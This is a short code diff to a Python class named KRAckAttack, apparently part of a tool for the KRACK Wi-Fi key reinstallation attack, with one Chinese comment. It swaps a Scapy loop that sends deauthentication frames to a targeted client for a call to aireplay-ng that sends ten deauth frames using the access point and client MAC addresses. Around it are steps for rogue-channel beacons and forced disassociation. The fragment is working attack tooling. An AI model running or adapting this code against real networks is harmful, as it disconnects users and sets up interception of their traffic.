@@ -855,10 +855,11 @@ class KRAckAttack():
 		self.send_csa_beacon(numbeacons=4)
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		for i in range(0, 11):
-			dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
-			deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
-			self.sock_real.send(deauth)
+		# for i in range(0, 11):
+		# 	dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
+		# 	deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
+		# 	self.sock_real.send(deauth)
+		subprocess.check_output(["aireplay-ng", "--deauth 10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_clientack])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
 		if self.clientmac:
